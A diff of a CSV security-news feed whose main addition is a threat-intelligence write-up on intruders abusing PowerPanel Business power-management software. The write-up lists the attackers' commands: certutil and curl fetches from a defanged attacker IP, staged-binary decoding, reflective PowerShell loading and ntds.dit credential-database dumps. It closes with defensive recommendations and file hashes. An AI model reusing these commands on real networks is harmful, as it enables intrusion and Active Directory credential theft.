@@ -1,4 +1,5 @@
 ID,Story,Date,Category,Vendor,Source,Modules,Type,Title,Link,Context,Full Text
+08b4129e2b4c,08b4129e2b4c,2026-11-23 16:52 UTC,"Attacks, Breaches & Threat Intel",Secureworks,Google News: WWT,Endpoint Security,Article,Dragos: Manufacturing Ransomware Attacks Climb to 876 in Q3,https://news.google.com/rss/articles/CBMikwFBVV95cUxPZzZHeHhRZGZsVDBEdlR0UXc0REZCS216TFlTbUh0czh1Z3FRTm1CeHFZaXg3VFJmLXBZYmZDb283Mm1ZcUpmWmxvMzc3VHhzSEl3X2poV1FPMmJtenhaNTBrb2lqbmxuTEZrZXFxQ2E3RzNMV2U4RlJCNEdqVWxsRi1WTmJLTkR5QVdNV1k3Nm1jTU0?oc=5,,
 4ac5f63540a0,f653dee337ce,2026-11-19 00:00 UTC,Product & Roadmap,Secureworks,Secureworks Taegis Release Notes,Identity Security Posture Management; Threat Intelligence; Endpoint Security,Article,"November 19, 2026",https://docs.taegis.secureworks.com/release/notes/#3929-november-19-2026,"22 (October 1, 2026)🔗 Features AI Expression Assistant: The new AI Expression Assistant, which helps you create CEL expressions from natural language descriptions in supported...","Release Notes for XDR🔗
 
 3.9.27 (November 5, 2026)🔗
@@ -754,6 +755,175 @@ OX Radar and Response Center are available to OX Security customers as part of O
 About OX Security
 
 OX Security is the first AI-Native Application Protection Platform built to secure software from prompt to production runtime. Its platform includes VibeSec, OX Code, OX Cloud, and OX Agentic Pentester, giving security teams a unified system for securing AI-driven development, applications, and cloud environments."
+6c3f18be537b,6c3f18be537b,2026-11-18 11:00 UTC,General Security News,Secureworks,Broadcom/Symantec Blog,Endpoint Security,Article,Behind the Power Outage: Unmasking a New Intrusion Vector in Enterprise Infrastructure Tools,https://www.security.com/threat-intelligence/power-management-software-attack-vector,"Significance In this attack, we have seen how attackers abused the legitimate documented features of a widely used and trusted application, CyberPower’s PowerPanel Business...","Stage 3: Use the channel as a general remote shell
+
+As expected, the attacker did not use their access for triggering actions from power events. Instead, they just used it to run arbitrary commands. Each command below was executed by the PPB service through cmd.exe.
+
+Command run by ppbed.exe → cmd.exe
+
+Purpose
+
+certutil -urlcache -f http://84[.]200[.]205[.]145/ NUL
+
+Test that the DC can reach the attacker's server
+
+certutil -decode C:\Windows\Temp\dt.exe.b64 C:\Windows\Temp\dt.exe
+
+Decode a staged binary
+
+curl.exe -v -m 25 http://84[.]200[.]205[.]145:55557/junk50k.bin -o C:\Windows\Temp\junk.bin
+
+Ingress Tool Transfer
+
+certutil -hashfile C:\Windows\Temp\wupd.exe MD5
+
+Verify a download
+
+C:\Windows\Temp\hello.exe
+
+Payload Execution
+
+powershell -ep bypass -c ""....EntryPoint.Invoke(…)"" (from ppgxrte.cmd)
+
+Reflective load of the same assembly
+
+certutil -decode …\rs.b64 …\rs.ps1
+
+Stage a PowerShell script
+
+netstat -an
+
+List connections
+
+certutil -decode …\bde_l.b64 …\bde_local.ps1
+
+Stage another PowerShell script
+
+dt.exe, wupd.exe and hello.exe were each downloaded from hxxp://84[.]200[.]205[.]145:55556/ as dt.bin, wupd.bin and hello.bin. wupd.exe is detected as MSIL.Killav!gen1, a .NET antivirus killer. The base64 blob in the PowerShell command decodes to a 4,096-byte .NET PE, byte-identical to hello.exe (SHA-256 d8ae46604dc4eab411977764bd923af686aea117fb33304520d928f1d382ef0e), whose only function is to print a greeting. It serves as a test to show that the reflective-load path works.
+
+Stage 4: Collect the Active Directory database, revising the scripts until it works
+
+The attackers were seen iteratively developing their data collection scripts on the fly. Scripts were executed, and results logged and checked, before further changes were made and executed again. Several iterations were made until the script achieved the required results.
+
+Script (staged via extcmd)
+
+Purpose
+
+ppskbcx.cmd
+
+Exports a copy of the Active Directory database (ntds.dit) using ntdsutil
+
+ppgxrte.cmd
+
+Load an embedded .NET program into memory
+
+ppgtpui.cmd
+
+Changes to run in the background with output sent to a log file
+
+ifm.cmd
+
+The same ntdsutil export
+
+ifm2.cmd
+
+The same export, plus a log file and a “done” marker file
+
+ifm3.cmd
+
+The same export, with a timestamp, tool check, and exit code written to the log
+
+ppotuff.cmd
+
+Saves the SYSTEM registry hive, then copies ntds.dit from a shadow copy with esentutl
+
+ifm4.cmd, ppinthw.cmd
+
+Copy ntds.dit from a shadow copy with esentutl
+
+The cycle of writing a script, uploading it, running it, checking results and then adjusting, bears the hallmarks of an interactive operation with a human at the keyboard. The pivot from ntdsutil ifm to esentutl /vss enables the attacker to copy a locked ntds.dit file via the Volume Shadow Copy service instead.
+
+Stage 5: Launch an implant from the same channel
+
+After the collection scripts are finished, PowerShell was used to start C:\Windows\System32\config\systemprofile\AppData\Local\50679f292a1\upnpcont.exe. The process lineage is: ppbed.exe → cmd.exe → powershell.exe → upnpcont.exe.
+
+The file upnpcont.exe is a name associated with a Microsoft UPnP component. It does not belong to a SYSTEM profile directory. It was observed loading atl.dll from the same directory with an unknown reputation. This pattern of using an old, trusted executable paired with an unknown DLL in a user-profile path is the typical pattern of the DLL side-loading technique.
+
+Processes spawned by the implant keep ppbed.exe as the root of their lineage. The command, vssadmin create shadow /for=C: and the later robocopy collection task ran from this chain: vssadmin.exe ← powershell.exe ← upnpcont.exe ← powershell.exe ← cmd.exe ← ppbed.exe ← services.exe.
+
+Significance
+
+In this attack, we have seen how attackers abused the legitimate documented features of a widely used and trusted application, CyberPower’s PowerPanel Business edition, to enable them to execute commands, while masquerading as the application itself. The command execution feature in its console enables admins to run scripts to handle power failures, but this feature is a double-edge sword that can be abused by attackers. It simply accepts a script, stores it, and runs it as SYSTEM through a signed service on a server that often sits in a privileged position.
+
+In this case, the attacker's tooling was almost entirely reliant on built-in Windows tools (certutil, ntdsutil, esentutl, reg, vssadmin, robocopy, wmic), along with a side-loaded implant, so defenders need to check the parent process for a meaningful indicator.
+
+What this attack shows is that UPS, power-management, and other infrastructure software should be treated like any other potentially dual-use RMM product; used with network restrictions, unique credentials, vigilant patching, and process-level monitoring.
+
+While we have not attributed this activity to a known actor, the interactive development of a data collection script during the attack points to a threat actor with live-human presence at the keyboard. Motivations of the attackers are unclear as no exfiltration or final payload such as ransomware was seen.
+
+Recommendations
+
+Locate all PPB console instances and restrict TCP port 3052 to named administrator hosts. Do not expose it to the internet, other servers, or user networks.
+
+Change the default administrator password, ensure patches are up to date
+
+Audit extcmd and temp\profile\extcmd paths on every PPB host and compare them with the product defaults. Treat any unknown scripts as hostile and review the console's event-to-command assignments.
+
+Review the techniques and indicators in this document. If you find them, assume Active Directory credentials are exposed and plan a krbtgt reset and wider credential rotation.
+
+Treat machines running power-management software as high-value assets and defend accordingly.
+
+Protection
+
+If an IOC is malicious and the file is available to us, Symantec Endpoint products will detect and block that file.
+
+Indicators of Compromise
+
+File indicators
+
+22b8f2776f1c941d8240ee4243da537147f8d2ee4d859a68038335da7b0d7688 – ppskbcx.cmd (ntdsutil ifm)
+
+04206431c83d1d81726e56fffb5166c0a7f138eb366e5aa918dee54af1ef22b5 – ppgtpui.cmd (ntdsutil ifm, background with log)
+
+899f072c505e56ed65b4ea5d64ab3bc0f98c39366b2c413c988551843e729451 – ppgxrte.cmd (reflective .NET load)
+
+76670eaadda9806c9aefa91c2ee4f2a33dcf8124574721a6ff072f19e7c03514 – pppwngl.cmd (reflective .NET load with try/catch)
+
+839300af16b7117adf05751e1847e1e026146d388cc328a179ba799eb1c9c229 – ppotuff.cmd (reg save, esentutl /vss)
+
+2776cfcdd46264043b823adaf37e0c85d0efd3b46d5fdbb72219535061d44b86 – ppinthw.cmd (esentutl /vss)
+
+1949894c26e03d6f15ed7f4393a89dbd52f8acc62959d3d5e4f695d6a19c6d9c – upload_[RANDOM].tmp (Tomcat upload temp file)
+
+AD collection scripts
+
+cbd790d052a57d18f1cd58fe4c9887340eec5d38bfae105caf0d222f30a856d5 – ifm.cmd
+
+c3f6aa4dc9cdbcd2cfdacd18e59e0c1af0406d59d1f81cd962ac3cde60626ee8 – ifm.cmd
+
+b0d382443411a7986ce7eda473c3e8ed787de9083db71deb4ea0539ed74c0c25 – ifm.cmd
+
+9abbcb4ac9a98690c666a2e843facf62af773d078db40570f08f052b0e42003f – ifm2.cmd
+
+c2454052f49e43226f69413ce58ba0bb3a2d89e7a52f32ef8adbf0961bb838c2 – ifm3.cmd
+
+8ee88ef957597fd4788ae9da4463dcbecec0f1969e6573204f4263f99f46b125 – ifm4.cmd
+
+Staged tools and loaders
+
+3d73d5342a11dce35081e70a4ea75d39ad65bc6d480337bd33c1d2e0ba4090ee – dt.exe
+
+12e716f48875befa978ff4a78a0b99a18b1809fc5bcc34c761158875da611aa8 – dt.exe
+
+bdea608430fbf6384ce518a542af3e0e69a685980ef826f7db3de20d4c835e26 – wupd.exe
+
+d8ae46604dc4eab411977764bd923af686aea117fb33304520d928f1d382ef0e – hello.exe
+
+Implant and side-loaded DLL
+
+5b2285f788eec4d17bf18d85795d457f40f7598bbab2697919f5810f54a9c3fe – upnpcont.exe
+
+d4032e61aa9ef01a5a174a90beffa5a27dd21b36e653ce5304907787554b7d95 – atl.dll"
 02f46da77fe4,02f46da77fe4,2026-11-18 04:45 UTC,General Security News,Secureworks,Google News: Deloitte,N/A,Article,Deloitte awarded $28M Treasury Bureau of Engraving and Printing MAC-Manufacturing Execution System Support task on Alliant 2,https://news.google.com/rss/articles/CBMi4gFBVV95cUxNdlg0aGtPcVVISS10WmNjdzlITFp4SUZhWTV4enRIQjV1Z0dBSTd0Y2hjWmEwQXVsLVBQaEdIX3Nya1JlSWpfV0l6MGJBdnZQaEx0bjZVa2ZhdEFsbzJpNmMxMFVQLUF3T2JJNUN4dmhvVmFrWkQzRmlpcHhyc1BFYndMelFYREFXU044ZjZubWRmdV95YmNQS0gzTGU3Nk9wc2VxR20wUXpxT25iMGp3TXhxbUh3T1ZuT3B3ZWdSUlRaNDQzbWVfUmxSRmJ6X0NQMkI0NGhiQ3ZBaXY5eTg5aXhR?oc=5,,
 338ab3dceac8,338ab3dceac8,2026-11-17 15:00 UTC,Vulnerabilities & Patching,Secureworks,LevelBlue Blog,Vulnerability Management,Article,"Your Vulnerability Scanner Found 10,000 Issues. Which Ones Actually Matter?",https://www.levelblue.com/blogs/levelblue-blog/your-vulnerability-scanner-found-10000-issues-which-ones-actually-matter,"By combining vulnerability data with exploitability, asset criticality, exposure, attacker activity and existing controls, security teams can turn a growing volume of findings...","Finding vulnerabilities is rarely the hardest part of Vulnerability Management.
 
@@ -1142,7 +1312,6 @@ Commenting on the report, Anthony Young, CEO at UK-based critical infrastructure
 “Organizations cannot assume that insurance will resolve the consequences of an attack when essential services are disrupted. Cyber Essentials matters because so many attacks still exploit basic weaknesses, and leaving those weaknesses in place makes life too easy for everyone from amateur hackers to nation-state attackers. We’ve spent 25 years telling organisations to get the basics right. AI is making it harder for them to get away with ignoring that advice,” Young added.
 
 The warnings come as the UK government is taking action through the introduction of the Cyber Security and Resilience Bill and the forthcoming National Cyber Action Plan to strengthen the UK's defenses."
-b6991aedea27,b6991aedea27,2026-10-30 22:41 UTC,General Security News,Secureworks,Google News: PwC,N/A,Article,Delivering the technology backbone for a modern manufacturing facility,https://news.google.com/rss/articles/CBMizwFBVV95cUxQU2NIbzBCS3p2V0FYUU5vOV9BQjdMS2dlSkRmbWpOdnJDVlQtb2Z1RWlveWwydGdfMXY3RHYwTVhzanowSHVSLWZocUpTRjRTVUdWRFRKMzJSY2hOc3NGckdhTzQtSzllbkJfYkxEcFR2X2h1RHhuVW9UcUJZckM0NTlkaUpCMm05cjF1TnNhQng1SHZUY3dSblFFUlJFZFdYS1prQW51c01BdF9GMk5wbWgzVlY0blRTZF9TNzJWQnhMWDJwei1MQ1FKbG1na0U?oc=5,,
 8372a6b58f91,8372a6b58f91,2026-10-30 12:00 UTC,General Security News,Secureworks,Cisco Newsroom,Other/General,Article,"Talking hybrid-cloud infrastructure, IT modernization, and AI readiness with Michael Dickman and Shawn Lund",https://newsroom.cisco.com/c/r/newsroom/en/us/a/y2026/m10/talking-hybrid-cloud-infrastructure-it-modernization-and-ai-readiness-with-michael-dickman-and-shawn-lund.html?source=rss,"Africa, Middle East, and India Algeria Angola Armenia Azerbaijan Bahrain Benin Botswana Burkina Faso Cameroun Cape Verde Chad Côte d’Ivoire Congo, The Democratic Republic Of The...","Africa, Middle East, and India
 
 Algeria
